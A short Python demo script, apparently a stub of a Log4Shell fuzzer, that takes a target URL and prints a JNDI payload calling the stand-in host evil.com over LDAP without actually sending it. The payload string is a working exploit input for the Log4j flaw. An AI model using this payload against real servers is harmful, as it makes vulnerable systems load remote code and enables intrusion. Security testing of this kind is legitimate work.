import sys

if len(sys.argv) < 2:
    print("Usage: python3 log4j_fuzzer.py <url>")
    sys.exit(1)

url = sys.argv[1]
payload = '${jndi:ldap://evil.com/a}'

print(f"[*] Fuzzing {url} with Log4Shell payload: {payload}")
# You would normally use Burp Suite or a DNS logger to catch callbacks.
print("[!] NOTE: This script is for demo purposes only. Monitor DNS logs externally.")

